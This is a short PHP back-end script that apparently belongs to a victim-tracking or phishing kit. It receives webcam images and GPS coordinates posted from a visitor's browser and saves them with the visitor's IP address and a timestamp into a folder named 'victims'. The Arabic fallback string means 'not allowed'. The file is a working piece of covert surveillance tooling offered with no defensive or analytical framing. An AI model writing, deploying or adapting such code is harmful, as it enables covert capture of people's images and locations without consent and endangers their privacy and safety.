<?php
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d_H-i-s");
$dir = "victims";
if (!is_dir($dir)) mkdir($dir, 0777, true);

if (!empty($_POST['img'])) {
    $img = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $_POST['img']));
    file_put_contents("$dir/{$time}_{$ip}_cam.jpg", $img);
}
$gps = $_POST['gps'] ?? "غير مسموح";
file_put_contents("$dir/{$time}_{$ip}_info.txt", "IP: $ip\nGPS: $gps\nTIME: $time");
?>